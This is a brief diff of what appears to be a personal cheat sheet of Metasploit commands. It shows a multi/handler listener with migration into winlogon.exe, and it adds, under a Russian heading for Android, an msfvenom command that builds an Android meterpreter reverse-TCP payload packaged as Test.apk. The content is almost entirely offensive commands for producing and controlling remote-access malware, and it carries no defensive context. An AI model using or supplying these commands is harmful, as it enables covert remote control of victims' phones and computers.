@@ -16,3 +16,10 @@ use exploit/multi/handler
 migrate -N winlogon.exe
 
 run
+
+
+
+Для АНДРОИД
+msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.50.123 lport= 5555 R> Test.apk
+
+
